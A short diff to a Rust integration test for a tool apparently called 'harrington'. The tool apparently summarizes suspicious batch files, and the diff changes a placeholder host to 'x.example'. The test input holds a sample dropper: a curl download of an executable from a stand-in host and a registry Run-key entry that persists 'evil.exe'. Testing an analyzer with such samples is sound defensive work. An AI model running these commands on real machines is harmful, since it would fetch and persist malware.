@@ -724,7 +724,7 @@ fn summarize_emits_compact_report() {
     let input = dir.path().join("in.bat");
     fs::write(
         &input,
-        "curl -o out.exe http://x/y.exe\r\nreg add HKLM\\Run /v Evil /d \"C:\\\\evil.exe\"\r\n",
+        "curl -o out.exe http://x.example/y.exe\r\nreg add HKLM\\Run /v Evil /d \"C:\\\\evil.exe\"\r\n",
     )
     .expect("write");
     let out = Command::cargo_bin("harrington")
